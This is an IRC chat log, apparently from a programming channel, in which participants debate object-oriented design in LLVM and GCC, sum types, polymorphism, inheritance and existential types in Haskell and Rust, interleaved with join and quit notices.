[00:06:19] *** Joins: qbt (~qbt@user/edun)
[00:06:26] *** Quits: qbt (~qbt@user/edun) (Client Quit)
[00:07:56] *** Joins: pulse (~pulse@user/pulse)
[00:09:17] *** Joins: pavonia (~user@user/siracusa)
[00:10:03] *** Joins: terminalpusher (~terminalp@2a01:586:9810:1:d5c5:51af:c205:6a9c)
[00:11:44] *** Quits: brabrax (~brabrax@user/brabrax) (Quit: ZNC 1.8.2 - https://znc.in)
[00:12:58] *** Joins: spaceangel (~spaceange@ip-89-176-181-220.net.upcbroadband.cz)
[00:14:27] *** Quits: triad (~triad@user/triad) (Ping timeout: 256 seconds)
[00:14:45] *** Joins: brabrax (~brabrax@user/brabrax)
[00:17:35] *** Quits: brabrax (~brabrax@user/brabrax) (Client Quit)
[00:19:08] *** Joins: brabrax (~brabrax@user/brabrax)
[00:22:12] *** Joins: resamvi (~resamvi@p4ff773f9.dip0.t-ipconnect.de)
[00:22:34] *** Joins: wildo (~lain6141@119.224.72.222)
[00:24:02] *** Quits: brabrax (~brabrax@user/brabrax) (Client Quit)
[00:26:21] *** Quits: diophantoz (~diophanto@user/diophantoz) (Ping timeout: 256 seconds)
[00:26:49] *** Joins: brabrax (~brabrax@user/brabrax)
[00:26:55] *** Quits: resamvi (~resamvi@p4ff773f9.dip0.t-ipconnect.de) (Ping timeout: 256 seconds)
[00:29:00] *** Quits: Inhahe (inhahe@107-213-219-122.lightspeed.miamfl.sbcglobal.net) (Remote host closed the connection)
[00:29:19] *** Joins: Inhahe (inhahe@107-213-219-122.lightspeed.miamfl.sbcglobal.net)
[00:29:42] *** Quits: xff0x (~xff0x@2001:1a81:5236:1e00:2c63:dc9c:df4d:2374) (Ping timeout: 268 seconds)
[00:30:18] *** Joins: xff0x (~xff0x@2001:1a81:5236:1e00:5867:e42a:e65f:e597)
[00:31:52] *** Quits: engest (~engest@50.39.177.170) (Read error: Connection reset by peer)
[00:32:18] *** Joins: engest (~engest@50.39.177.170)
[00:32:34] *** Quits: CodeMouse92 (~CodeMouse@user/codemouse92) (Quit: Oh freddled gruntbuggly | Thy micturations are to me | As plurdled gabbleblotchits | On a lurgid bee)
[00:33:43] *** Joins: Guest4193 (~Guest41@eth-west-pareq2-46-193-4-100.wb.wifirst.net)
[00:34:38] *** Quits: ___nick___ (~quassel@cpc68286-cdif17-2-0-cust533.5-1.cable.virginm.net) (Ping timeout: 268 seconds)
[00:34:44] *** Joins: DevAntoine (~DevAntoin@2a01:e34:ec4e:a200:d0fd:3cfa:5fd6:6824)
[00:34:50] <Guest4193> could anyone familiar with LLVM confirm (or deny) that the C++ code is object-oriented?
[00:35:11] *** Quits: flakland (~flaknet99@32.211.211.39) (Remote host closed the connection)
[00:35:19] <Guest4193> https://craftinginterpreters.com/introduction.html seems to imply so
[00:35:19] <bayaz> Title: Introduction · Crafting Interpreters 
[00:35:23] *** Joins: flakland (~flaknet99@32.211.211.39)
[00:35:30] *** Joins: dsrt^ (~dsrt@wsip-98-188-242-6.mc.at.cox.net)
[00:35:34] <flakland> llvm written in C++?
[00:36:00] <Guest4193> it's not>
[00:36:02] <Guest4193> ?
[00:36:12] <GeDaMo> I believe that LLVM is written in C++, yes
[00:36:14] <flakland> i don't use it so i'm askin ya
[00:36:20] <flakland> hmm
[00:36:28] <Guest4193> yes, double-check with wikipedia
[00:36:29] *** Quits: Akuli (~Akuli@82-203-165-175.bb.dnainternet.fi) (Quit: Leaving)
[00:36:35] <Guest4193> checked*
[00:36:44] <Guest4193> but is it object-oriented?
[00:36:51] <flakland> check the source
[00:37:19] *** Joins: masber (~masber@213.55.224.99)
[00:39:34] *** Quits: DevAntoine (~DevAntoin@2a01:e34:ec4e:a200:d0fd:3cfa:5fd6:6824) (Ping timeout: 268 seconds)
[00:39:34] <flakland> what do you mean by object-oriented anyway
[00:39:48] <flakland> one could argue a tree node is an object
[00:40:41] <Guest4193> well it is: https://github.com/llvm/llvm-project/blob/main/llvm/include/llvm/IR/Type.h
[00:40:42] <bayaz> Title: llvm-project/Type.h at main · llvm/llvm-project 
[00:41:34] *** Joins: audiobirb (~audio@user/audio)
[00:42:06] <Guest4193> flakland: the usual encapsulation, polymorphism, inheritance, class-based shenanigans
[00:42:12] <flakland> hmm they don't have complex numbers, hm hmm
[00:42:37] <flakland> yeah you can encapsulate all sorts of crazy things in a tree node
[00:42:58] <Guest4193> but what do you mean by tree node exactly
[00:43:15] <flakland> a pointer to the object
[00:44:07] *** Joins: Ilyu (~quassel@166.215.82.79.rev.sfr.net)
[00:44:15] <Guest4193> and ... encapsulating an object's member would be done how?
[00:44:51] *** Quits: jaysicks (~jaysicks@178-164-135-126.pool.digikabel.hu) (Remote host closed the connection)
[00:44:52] <flakland> in gcc  it can be a tree within a tree
[00:45:17] *** Quits: CodeSpelunker (~CodeSpelu@user/codespelunker) (Quit: CodeSpelunker)
[00:45:56] *** Joins: Joanna (uid57472@id-57472.lymington.irccloud.com)
[00:47:52] <Guest4193> flakland: you must be joking ... right? I mean I dislike OOP as much as the next guy but it's honestly the first time I hear of tree-based objects programming, if this is for real please tell me more
[00:47:54] *** Joins: lunarkitty (uid501895@user/pyra)
[00:48:02] *** Joins: Pickchea (~private@user/pickchea)
[00:49:09] *** Joins: molson (~molson@24-220-198-232-dynamic.midco.net)
[00:50:54] <flakland> https://github.com/gcc-mirror/gcc/blob/master/gcc/tree.def
[00:50:55] <bayaz> Title: gcc/tree.def at master · gcc-mirror/gcc 
[00:50:59] *** Quits: flakland (~flaknet99@32.211.211.39) (Remote host closed the connection)
[00:51:06] *** Quits: jonaskabrink (~jonaskabr@ip1f12b838.dynamic.kabel-deutschland.de) (Quit: jonaskabrink)
[00:51:12] *** Joins: flakland (~flaknet99@32.211.211.39)
[00:51:42] <flakland> https://github.com/gcc-mirror/gcc/blob/master/gcc/tree.h
[00:51:46] <bayaz> Title: gcc/tree.h at master · gcc-mirror/gcc 
[00:52:42] *** Quits: orange (~orangeext@user/orangeextract) (Quit: Leaving)
[00:52:53] <flakland> as you can see here, gcc is "tree-oriented-programming"
[00:54:09] *** Joins: resamvi (~resamvi@p4ff773f9.dip0.t-ipconnect.de)
[00:54:33] <flakland> so not only does the object matter, but it's position in the tree overall
[00:56:28] *** Parts: Sircle (~Sircle@88.246.75.14) ()
[00:56:34] <flakland> btw this is what they call "generic gcc" IR, there is another level below this
[00:56:55] <flakland> maybe even two more levels
[00:58:39] *** Quits: resamvi (~resamvi@p4ff773f9.dip0.t-ipconnect.de) (Ping timeout: 256 seconds)
[00:59:06] *** Quits: masber (~masber@213.55.224.99) (Quit: Client closed)
[00:59:23] <Guest4193> flakland: so the tree is what gcc first parses code c/c++/go ... the AST?
[00:59:54] <Guest4193> s,...,... into
[01:00:48] <flakland> it's like pipeline stages, yeah. at the end it turns into RTL which is what gets used as the source of instructions (i think i don't know much about RTL )
[01:02:41] *** Joins: Photic (~Photic@user/photic)
[01:03:45] *** Joins: sonny (~sonny@bras-base-london1483w-grc-30-74-12-157-200.dsl.bell.ca)
[01:05:08] *** Quits: LuKaRo (~LuKaRo@p4fc32190.dip0.t-ipconnect.de) (Ping timeout: 260 seconds)
[01:07:05] *** Quits: ozarker (~ozarker@172-15-173-110.lightspeed.mssnks.sbcglobal.net) (Read error: Connection reset by peer)
[01:07:53] *** Quits: GeDaMo (~GeDaMo@user/gedamo) (Remote host closed the connection)
[01:08:12] *** Quits: Chanakan5591 (~Chanakan5@user/chanakan5591) (Ping timeout: 250 seconds)
[01:09:07] *** Joins: LuKaRo (~LuKaRo@p5deda91b.dip0.t-ipconnect.de)
[01:09:31] *** Joins: Chanakan5591 (~Chanakan5@user/chanakan5591)
[01:10:33] *** yin is now known as onion
[01:12:53] *** Quits: sonny (~sonny@bras-base-london1483w-grc-30-74-12-157-200.dsl.bell.ca) (Remote host closed the connection)
[01:13:11] *** Joins: sonny (~sonny@bras-base-london1483w-grc-30-74-12-157-200.dsl.bell.ca)
[01:13:42] *** Quits: sonny (~sonny@bras-base-london1483w-grc-30-74-12-157-200.dsl.bell.ca) (Remote host closed the connection)
[01:16:19] *** Quits: INeedAHandle (~INeedAHan@39.124.72.106) (Quit: My MacBook Air has gone to sleep. ZZZzzz…)
[01:16:40] *** Quits: terminalpusher (~terminalp@2a01:586:9810:1:d5c5:51af:c205:6a9c) (Remote host closed the connection)
[01:16:57] *** Joins: INeedAHandle (~INeedAHan@39.124.72.106)
[01:18:54] *** Quits: engest (~engest@50.39.177.170) (Read error: Connection reset by peer)
[01:19:21] *** Joins: engest (~engest@50.39.177.170)
[01:21:38] <ski> Guest4193 : tree types are recursive variant/sum types. sum types are the dual (the "opposite") of product types (/ record types / object types)
[01:23:00] <flakland> lol sum types i remember this one almost
[01:23:45] <ski> aka tagged/discriminated/disjoint union types, or variant record types (Pascal,Ada)
[01:23:49] <Guest4193> wait how is a tree of ints a sum type?
[01:24:07] <ski> either you have an internal node, or you have a leaf node
[01:24:09] <flakland> trees don't have to be tagged or discriminated in ada
[01:24:14] <flakland> don't know what disjoint is supposed to mean
[01:24:29] <ski> disjoint means that the alternatives (by definition) don't overlap
[01:24:44] <ski> (to be distinguished from the notion of union of (sub)sets, in set theory)
[01:24:46] <Guest4193> aha yes of course, in haskell this is `data Tree a = Node a | Leaf`
[01:25:35] *** Joins: zaher (~zaher@37.48.190.214)
[01:25:38] <ski> flakland : well, if you want to, you could represent a tree, by storing the nodes in an array ..
[01:26:06] <ski> (you'd still need some kind of sentinel for leaves)
[01:26:26] *** Quits: WilliamLeara (~wdl@cpe-76-185-2-28.tx.res.rr.com) (Ping timeout: 268 seconds)
[01:26:55] <ski> Guest4193 : well .. not exactly
[01:28:54] *** Joins: resamvi (~resamvi@p4ff773f9.dip0.t-ipconnect.de)
[01:28:59] <ski> anyway, dealing with trees, you usually want to do a case distinction, doing different things, depending on what kind of node you're handed
[01:29:39] <Guest4193> ski: what did I miss?
[01:29:41] <ski> this is dual to defining an object by message dispatching (defining methods, giving behaviour for when it receives a message of this or that kind)
[01:29:56] <ski> Guest4193 : well, your definition isn't even recursive ..
[01:30:21] *** Quits: tane (~tane@user/tane) (Quit: Leaving)
[01:33:34] *** Quits: Pickchea (~private@user/pickchea) (Quit: Leaving)
[01:33:49] <Guest4193> oh yes `data Tree a = Node a [Tree a] | Leaf` is what that should've been
[01:33:50] *** Quits: resamvi (~resamvi@p4ff773f9.dip0.t-ipconnect.de) (Ping timeout: 268 seconds)
[01:34:23] <ski> that'd work
[01:34:50] <flakland> case distinction, sounds like polymorphism to me
[01:35:09] <ski> of course, for representing phrases in a language, you'd want multiple distinct types of nodes, probably both for internal and leaf nodes
[01:35:43] <ski> "case distinction" in several well-known languages can be done with the `switch' command
[01:35:59] <ski> do you call that polymorphism ?
[01:36:32] *** Joins: ThePhilgrim2 (~ThePhilgr@151.41.8.149)
[01:36:35] <ski> (there's multiple distinct notions of "polymorphism" floating around ..)
[01:36:52] *** Joins: solidfox (~snake@user/snake)
[01:37:34] <ski> (.. overloading, coercion, inclusion, and parametric)
[01:38:25] *** Joins: Klinda_PING (~superleag@user/klinda)
[01:38:26] <flakland> ski, yes
[01:38:39] *** Joins: exvicesindaco (~exvicio@user/exvicesindaco)
[01:38:40] <flakland> i do, anyway
[01:39:05] *** Quits: Klinda (~superleag@user/klinda) (Killed (NickServ (GHOST command used by Klinda_PING)))
[01:39:12] *** Klinda_PING is now known as Klinda
[01:39:23] *** Quits: ThePhilgrim (~ThePhilgr@151.41.8.149) (Ping timeout: 268 seconds)
[01:40:49] *** Quits: snake (~snake@user/snake) (Quit: Leaving)
[01:40:55] *** solidfox is now known as snake
[01:41:11] <Guest4193> I only know 2 types of notions of polymorphism: in functional-land it's like that rose tree, it can be a Tree Int or Tree WhateverYouFancy, the second one is from OOP-land, and is a result of inheritance and overriding methods and properties so you can do animal.makeSound() without knowing if it's a Dog or a Lion
[01:41:21] *** Joins: vysn (~vysn@user/vysn)
[01:41:27] *** Joins: [itchyjunk] (~itchyjunk@user/itchyjunk/x-7353470)
[01:42:02] <Guest4193> last year they made me do polymorphism for a GUI library in C ... the horror
[01:42:06] <flakland> you have to know at compile-time
[01:42:46] <flakland> otherwise it's just dynamic linking
[01:43:18] <beaky> nice what is your favorite polymorphism
[01:45:41] *** Joins: ITD4004 (~ITD4004@187.61.233.248)
[01:46:22] *** Quits: aradesh (~aradesh@user/aradesh) (Quit: WeeChat 1.9.1)
[01:47:00] *** Quits: jinsun (~quassel@user/jinsun) (Read error: Connection reset by peer)
[01:47:52] *** Joins: merijn (~merijn@83-160-49-249.ip.xs4all.nl)
[01:48:00] <ski> Guest4193 : "On Understanding Types, Data Abstraction, and Polymorphism" by Luca Cardelli,Peter Wegner in 1985-12 at <http://lucacardelli.name/Papers/OnUnderstanding.A4.pdf>
[01:48:26] *** Joins: jinsun (~quassel@user/jinsun)
[01:48:41] <ski> Guest4193 : the first you mentioned is parametric polymorphism. the second is inclusion/subtyping polymorphism
[01:49:11] *** Joins: [_] (~itchyjunk@user/itchyjunk/x-7353470)
[01:49:46] <ski> ("On Understanding Data Abstraction, Revisited" by William R. Cook in 2009-10 at <http://www.cs.utexas.edu/~wcook/Drafts/2009/essay.pdf> might perhaps also be interesting)
[01:50:12] <ski> flakland : hm ?
[01:50:49] <Guest4193> ski: thank you, should be a good read
[01:51:12] <ski> (oh, and e.g. Java,C#,C++ have both parametric and subtyping polymorphism)
[01:51:45] <ski> yw
[01:51:57] <flakland> the type must be known at compile time, otherwise you're just using  a form of dynamic linking. that was in response to calling animal.make_sound() without knowing the actual type
[01:52:20] *** Quits: [itchyjunk] (~itchyjunk@user/itchyjunk/x-7353470) (Ping timeout: 268 seconds)
[01:52:38] <ski> flakland : hm, so you consider callbacks a form of dynamic linking ?
[01:53:06] <flakland> animal.make_sound() is a callback?
[01:53:15] <ski> (hm .. also people often conflate classes and (class) types)
[01:53:54] <ski> flakland : callbacks would be one common way of implementing it (in general, if you don't know the implementation to call, at compile-time), yes
[01:54:13] <flakland> using a switch statement? 
[01:54:15] <flakland> ;)
[01:54:51] *** Quits: magla (~gelignite@55d4c66c.access.ecotel.net) (Quit: Stay safe!)
[01:54:58] <ski> well, that is also possible ("defunctionalization") .. but more common would be to compile to an indirect jump (or call/jsr) instruction
[01:55:38] <onion> what's "dynamic linking"? does it relate t "dynamic dispatch"?
[01:56:07] * ski 's trying to get a grip on what flakland means by "dynamic linking", fwiw ..
[01:56:33] <flakland> i'm challenging the claim that animal_make_sound() can be made without knowing the type
[01:56:43] <flakland> you guys are fixating on a nitpick
[01:56:57] <ski> without knowing the type, *when* ?
[01:57:11] <flakland> like i said, you have to know at compile-time
[01:57:14] <ski> (compile-time ? run-time ?)
[01:57:17] <flakland> why is this even being challenged?
[01:57:19] *** Quits: user51 (~user51@176.228.59.81) (Quit: leaving)
[01:57:26] <flakland> a bunch of noise for nothing
[01:57:52] <ski> (another issue is that people also have differing opinion of what "type" means .. e.g. if you have a tree node, i would not call it a type difference, if it's an internal node, or a leaf node)
[01:58:53] <bjs> flakland: that doesn't seem right.  What about a language like Python?  The "type" (of any flavour) isn't known at compile time.  And it certainly doesn't seem right to describe anything Python does as "linking".
[01:59:03] *** Joins: derjanni (~textual@ip-88-153-100-48.hsi04.unitymediagroup.de)
[01:59:05] <flakland> python has types?
[01:59:11] <bjs> Unless of course, you're using the phrase "dynamic linking" in a way that is foreign to me
[01:59:15] <onion> words don't mean anything anyways. we should all communicate in ASTs
[01:59:25] <ski> bjs : hence my queries
[01:59:39] *** Quits: exvicesindaco (~exvicio@user/exvicesindaco) (Quit: Going offline, see ya! (www.adiirc.com))
[01:59:43] *** Joins: _inky (~inky_@46.36.117.129)
[02:00:27] <derjanni> Does anyone know if the PayPal sandbox is defunct currently?
[02:00:38] <flakland> you guys can believe whqtever you want, like "trees are not objects"  i will not fight the status quo and many textbooks that i disagree with based on personal experience and applying logic
[02:00:54] <flakland> just telling it how it really its
[02:01:00] <bjs> trees are not objects?  what 
[02:01:07] <flakland> exactly
[02:01:24] <ski> anyway, you can clearly extract an address (only knowable at run-time, in general), pointing to a routine that, for the current object, implements `makeSound', from a slot at a known offset from the start of the object/record in question
[02:01:26] *** Joins: soapsudsxx (~soapsudsx@209.221.40.144)
[02:01:48] <bjs> flakland: how can a tree abstractly either be or not be an object,  unless you mean some specific instance of a tree structure in some specific language?
[02:02:02] <flakland> read the scroll back
[02:02:06] <flakland> i made my case.
[02:02:15] <LiaoTao> A tree is an object in the category of tree-like things
[02:02:23] <ski> bjs : "object" can mean many things. in the above context, people talked about OOP, and so presumably "object" should be taken in that sense
[02:02:38] *** Joins: resamvi (~resamvi@p4ff773f9.dip0.t-ipconnect.de)
[02:02:49] <ski> e.g. in C, objects are stored in memory, e.g. you can have a (composite) array object, consisting of many `int' objects
[02:03:00] <bjs> ski: sure,  just note that many languages have a specific term "object", e.g. like C that does not correspond with the "OOP" definition
[02:03:00] <ski> (and there's no methods involved)
[02:03:09] * ski nods
[02:03:31] <ski> LiaoTao : .. and the morphisms ?
[02:04:27] <onion> ski: lol category theory
[02:04:42] <onion> we need more words
[02:04:47] <LiaoTao> ski, I'm not sure yet, but one day I'll have climbed them all
[02:05:48] <onion> to climb a tree do you start at the leafs?
[02:06:03] <onion> until you reach the root?
[02:06:06] <ski> only in deductive databases
[02:06:28] <bjs> onion: computer scientists are weird and draw their trees upside down
[02:06:33] <bjs> it's like they've never seen one before
[02:06:52] <onion> "like"
[02:07:05] <beaky> yes starting from the leafs and going to the root is backward chaining i think
[02:07:08] *** Quits: resamvi (~resamvi@p4ff773f9.dip0.t-ipconnect.de) (Ping timeout: 268 seconds)
[02:07:12] <LiaoTao> ski, I'm actually trying to come up with some form of reasonable composition, but I'm drawing a blank
[02:07:26] <ski> no, backwards-chaining starts at the root/goal
[02:07:55] <beaky> o right so i have it backwarsd  then
[02:09:31] *** Joins: sonny (~sonny@bras-base-london1483w-grc-30-74-12-157-200.dsl.bell.ca)
[02:11:06] <ski> deductive databases (as well as event-directed, rule-based, sensory-event-to-action, systems) are forward-chaining. (the former are set-at-a-time. logic programming is backwards-chaining, tuple-at-a-time, goal-directed)
[02:11:52] *** Joins: mestre (~mestre@191.177.175.57)
[02:12:31] <beaky> i like coq because it lets you do backwards chaining to solve the theorems
[02:12:46] <beaky> whereas in agda you must do forward chaining
[02:13:00] * LiaoTao is convinced people learn coq just to be able to say i like coq
[02:13:24] *** Joins: Inst_ (~Inst@2601:6c4:4080:3f80:1d49:739d:9075:d5df)
[02:13:45] *** Joins: gggp (~gggp@111-251-142-222.dynamic-ip.hinet.net)
[02:13:54] <Guest4193> LiaoTao: very interesting
[02:13:56] <ski> anyways, handling trees, you normally have at least two cases (one kind of internal node, and one kind of leaf node). and most commonly, you want to do case-distinction, handling the different types of nodes differently (often checking what kind multiple nodes are, before deciding what to do) .. so this naturally is expressed using sum types (discriminated/tagged union), rather than product types (OOP 
[02:14:02] <ski> objects)
[02:14:08] <sonny> coq is getting a name change
[02:14:52] <Guest4193> well the entire french language needs that
[02:14:59] <sonny> ouch
[02:15:22] <sonny> ski: wonder why it seems to be either or, languages can have both
[02:15:33] <sonny> I have no context for this discussion btw
[02:16:11] *** Joins: arcatech (~arcatech@user/arcatech)
[02:16:13] <ski> (of course, if you insist, you can do the VisitorPattern in OOP, to simulate sum types .. but it's clunky, and harder to do multiple-dispatch)
[02:16:36] <ski> sonny : yes, imho, both product and sum types are essential
[02:16:39] <Guest4193> OOP should just frick off and let data be data
[02:16:59] <beaky> but what if data is a bad idea as alan kay would say
[02:17:01] *** Quits: arcatech (~arcatech@user/arcatech) (Client Quit)
[02:17:15] <sonny> alan kay says people messed up his idea lol
[02:17:21] <ski> beaky : forward-chaining, in which sense ?
[02:17:42] *** Quits: Inst (~Inst@2601:6c4:4080:3f80:cd36:4dbb:1af8:be8) (Ping timeout: 260 seconds)
[02:18:09] <Guest4193> ski: what's your take on OOP?
[02:18:12] <beaky> forward since you have to advance towards thge goal rather than starting from it
[02:18:38] <ski> Guest4193 : message-dispatching is a good idea, sometimes
[02:18:39] *** Quits: gggp (~gggp@111-251-142-222.dynamic-ip.hinet.net) (Quit: My MacBook has gone to sleep. ZZZzzz…)
[02:19:08] <sonny> actor model ftw
[02:19:21] <ski> beaky : hm, do you mean with equational reasoning, or what ?
[02:19:34] *** Quits: AquaL1te (~AquaL1te@user/aqual1te) (Ping timeout: 260 seconds)
[02:20:26] <Guest4193> what if message-dispatching changes the state of the object you're targeting
[02:20:44] <ski> beaky : it seems easier to code, by inserting constructions that fill a hole (possibly introducing new subholes), rather than using `let' or `where' all the time to reason from the assumptions/parameters, no ?
[02:20:47] <beaky> yes in agda with equational reasoning you must start from the arguments and then work your way forwards all the way to the goal whereas in coq you can 'rewrite x' from the goal itself
[02:21:14] <Guest4193> wouldn't that lump their states together? then what's the purpose of message-dispatching ?
[02:21:17] <sonny> which one does prolog use?
[02:21:17] <ski> Guest4193 : i think implicit state change is usually a bad idea
[02:21:24] *** Joins: arcatech (~arcatech@user/arcatech)
[02:21:30] <ski> Prolog is backward-chaining
[02:21:35] <beaky> the holes help make things easier tho i miss being able to work my way backwards
[02:21:37] <ski> (as is Twelf)
[02:21:54] *** Quits: mestre (~mestre@191.177.175.57) (Quit: Lost terminal)
[02:21:59] <Guest4193> sonny: actor model? I saw that on Pony's home page last week and their explanation just flew by my head
[02:22:31] *** Quits: x003fgqwe (uid479614@id-479614.lymington.irccloud.com) (Quit: Connection closed for inactivity)
[02:22:32] *** Quits: merijn (~merijn@83-160-49-249.ip.xs4all.nl) (Ping timeout: 268 seconds)
[02:22:44] <Guest4193> ski: some examples please on when sending messages is a good idea?
[02:22:46] <ski> Guest4193 : the purpose is to have custom, object-specific, responses to messages (there's no need to have an internal, changing, state for this)
[02:23:17] <edgar-rft> most actors are bad models and most models are bad actors, both together works rather seldom
[02:23:28] <Guest4193> also what about encapsulation, subtype polymorphism and (MULTIPLE) INHERITANCE
[02:23:45] <ski> Guest4193 : when you deem it's more likely to want to add another property, or change (or remove) an existing one, than to add another kind of object (supporting the same set of messages)
[02:23:55] <sonny> inheritance seems to fail in general
[02:24:19] <ski> subtype polymorphism is a bit overrated, imho. and implementation inheritance definitely is
[02:25:06] <ski> (implementation) inheritance tends to go counter to loose coupling
[02:25:12] <flakland> subtypes always seemed like a workaround/hack to me
[02:25:17] <ski> (interface inheritance is okay)
[02:25:20] <sonny> oop as done by popular languages java, c++ etc isn't what alan kay wanted iirc
[02:25:21] *** Joins: DevAntoine (~DevAntoin@2a01:e34:ec4e:a200:d0fd:3cfa:5fd6:6824)
[02:25:32] *** Quits: arcatech (~arcatech@user/arcatech) (Client Quit)
[02:25:36] <ski> what about Simula ?
[02:25:48] <Guest4193> I prefer traits a la Rust (or Haskell) to inhertiance
[02:25:48] <LiaoTao> Interface inheritance is the only way to go these days
[02:25:53] <sonny> no clue, that's what soustrop likes though
[02:26:00] <LiaoTao> If you have to do inheritance, that is
[02:26:06] <ski> Guest4193 : does Rust support full existentials, yet ?
[02:27:31] <sonny> inheritance is useful, but you probably would need to have a well defined concept / model to use it
[02:27:37] <sonny> probably best for library devs
[02:27:54] <ski> (existentials is related to OOP .. and (in a different way) related to ADTs (Abstract Data Types). also related to closures (since "Closures are a poor man's objects." .. also "Objects are a poor man's closures."))
[02:28:08] *** Joins: arcatech (~arcatech@user/arcatech)
[02:28:14] <sonny> or when you literally have a tree like problem
[02:28:34] <ski> when's inheritance of use, there ?
[02:29:18] <edgar-rft> inheritance is useful in the woods :-)
[02:29:50] *** Quits: Inline (~Inline@2a02:908:1252:7a80:ae5d:7719:e7f1:5947) (Ping timeout: 260 seconds)
[02:29:56] *** Quits: xff0x (~xff0x@2001:1a81:5236:1e00:5867:e42a:e65f:e597) (Ping timeout: 268 seconds)
[02:30:04] <sonny> ski: managing something with a heirachy
[02:30:17] <sonny> afk
[02:30:29] *** Joins: xff0x (~xff0x@2001:1a81:5236:1e00:dda8:eac2:4d01:562e)
[02:30:35] * ski . o O ( "Subtyping and Inheritance for Inductive Types" in 1997 at <https://www.cs.ru.nl/E.Poll/papers/durham97.pdf>,"Subtyping and Inheritance for Categorical Datatypes" in 1997 at <https://www.cs.ru.nl/E.Poll/papers/kyoto97.pdf>, both by Erik Poll )
[02:30:43] <ski> sonny : i don't really follow
[02:30:53] <LiaoTao> ski, Thanks for the reading
[02:31:01] <ski> np
[02:31:11] *** Quits: DevAntoine (~DevAntoin@2a01:e34:ec4e:a200:d0fd:3cfa:5fd6:6824) (Ping timeout: 268 seconds)
[02:31:42] <ski> (also you might like the Cardelli paper i linked before, if you haven't seen it before)
[02:32:11] *** Joins: independent56 (~independe@85.255.232.182)
[02:32:53] <LiaoTao> Ah great, even more thanks
[02:33:41] *** Joins: gggp (~gggp@111-251-142-222.dynamic-ip.hinet.net)
[02:33:42] *** Quits: gggp (~gggp@111-251-142-222.dynamic-ip.hinet.net) (Client Quit)
[02:34:02] *** Joins: resamvi (~resamvi@p4ff773f9.dip0.t-ipconnect.de)
[02:38:07] <Guest4193> ski: what do you mean by full existential? here https://github.com/rust-lang/rfcs/blob/master/text/2071-impl-trait-existential-types.md it seems they can be generic, match closures and implement Traits
[02:38:08] <bayaz> Title: rfcs/2071-impl-trait-existential-types.md at master · rust-lang/rfcs 
[02:38:22] *** Quits: resamvi (~resamvi@p4ff773f9.dip0.t-ipconnect.de) (Ping timeout: 256 seconds)
[02:38:26] *** Quits: znedw5 (~znedw@home.znedw.com) (Ping timeout: 245 seconds)
[02:38:34] *** Joins: znedw5 (~znedw@home.znedw.com)
[02:42:06] <ski> Guest4193 : i mean not only being able to have an object/value of some unknown type, together with say some functions that knows how to operate on it -- but also to be able to have e.g. a collection of elements of that (single) unknown type, together with those functions (the functions not being bundled with the individual objects, but with the whole collection)
[02:43:41] *** Joins: quartz (~quartz@user/quartz)
[02:43:58] <LiaoTao> That is to say Box<dyn Trait>, bound to a single type therefore minus the Box?
[02:44:18] *** Quits: znedw5 (~znedw@home.znedw.com) (Read error: Connection reset by peer)
[02:44:32] *** Quits: FreeFull (~freefull@user-5-173-152-113.play-internet.pl) ()
[02:44:44] *** Joins: znedw5 (~znedw@home.znedw.com)
[02:45:26] <ski> Guest4193 : in Haskell terms, the former is like `exists x. (x,Int -> x -> x,x -> Maybe (x,Int))' (which could be used to represent queues) or `exists x. Widget x *> x' .. while the latter would be like `exists x. (Map String x,x -> x -> Ordering,x -> x -> x,x -> Integer,x -> IO ())' (a finite map, mapping `String's to `x's, together with a bunch of "methods", including a *binary* method that can be fed 
[02:45:32] <ski> two (possibly distinct) values from the finite map, since we know they have the *same*, albeit unknown, type)
[02:46:23] *** Joins: DarkTrick_ (~DarkTrick@pl-749-047.bunbun.ne.jp)
[02:49:52] *** Joins: pizdets (~pizdets@183.182.115.116)
[02:50:09] *** Quits: src (~src@user/src) (Quit: Leaving)
[02:50:21] *** Quits: sonny (~sonny@bras-base-london1483w-grc-30-74-12-157-200.dsl.bell.ca) (Quit: Client closed)
[02:50:56] <ski> (s/represent/represent (an interface to)/)
[02:52:11] *** Joins: amigojapan (uid86330@id-86330.helmsley.irccloud.com)
[02:53:46] *** Quits: arcatech (~arcatech@user/arcatech) (Quit: Bye.)
[02:54:06] *** Joins: bipolarus (uid525826@id-525826.helmsley.irccloud.com)
[02:54:53] *** Joins: arcatech (~arcatech@user/arcatech)
[02:58:46] *** Quits: DnzAtWrk (~DnzAtWrk@88-115-149-152.elisa-laajakaista.fi) (Ping timeout: 260 seconds)
[02:58:47] *** Quits: abirkill (snoopy@d172-218-198-90.bchsia.telus.net) (Quit: Let us prepare to grapple with the ineffable itself, and see if we may not eff it after all.)
[02:59:20] <Guest4193> ski: I didn't even know Haskell had existential types (honestly I didn't even know they existed before you mentioned them) so for my untrained eye, I don't see what's hard about having collections of elements of unknown type v. one element of unknown type
[02:59:43] *** Quits: mickey8 (~user@user/mickey) (Remote host closed the connection)
[03:00:02] *** Joins: kpolalniy (~kpolalniy@cpc108203-wake9-2-0-cust141.17-1.cable.virginm.net)
[03:00:10] *** Joins: mickey8 (~user@user/mickey)
[03:00:56] *** Quits: kpolalniy (~kpolalniy@cpc108203-wake9-2-0-cust141.17-1.cable.virginm.net) (Client Quit)
[03:02:20] *** Joins: lind{at}yahoo (uid486956@id-486956.tinside.irccloud.com)
[03:02:28] <ski> Guest4193 : all elements have the same, common, unknown type
[03:02:57] <lind{at}yahoo> organization to tackle the Defense Innovation Unit's Space Visualization Challenge: we're focusing on helping managing space junk - http://junkwerx.space <-- looking for collaborators, SMEs and partners
[03:02:58] <bayaz> Title: Welcome To JunkWERX.space · jlind0/junkwerx.space Wiki 
[03:02:58] <ski> last i checked, Rust didn't have this. but that was (i think ?) sometime last year
[03:03:47] <ski> Guest4193 : anyway, existential types is a language extension in Haskell. and implementations have had it for many years
[03:03:53] <ski> (10 ? 15 ? i can't recall)
[03:04:09] *** Quits: plastico (~plastico@neomutt/plastico) (Quit: WeeChat 3.3)
[03:04:32] *** Quits: Auron (Auron956@user/auron) (Remote host closed the connection)
[03:05:25] <flakland> lina{at}yahoo all my money is on vatnet, hopping from junk chunk to junk chunk making cathodes
[03:05:43] <ski> (oh, and the extension doesn't use the syntax i employed above .. (there's two main ways to encode it, using extensions) .. but, when speaking/thinking conceptually / at a higher level, i prefer using that pseudo-Haskell syntax, to not muddle the waters too much with lower-level representation considerations)
[03:06:25] *** Joins: resamvi (~resamvi@p4ff773f9.dip0.t-ipconnect.de)
[03:07:08] <lind{at}yahoo> flakland: looking for help right now, not even money. The proposal is due 18 Nov 2021 and we need to identify platforms, tech and apply it to the domain
[03:07:12] *** Joins: nvmd (~nvmd@user/nvmd)
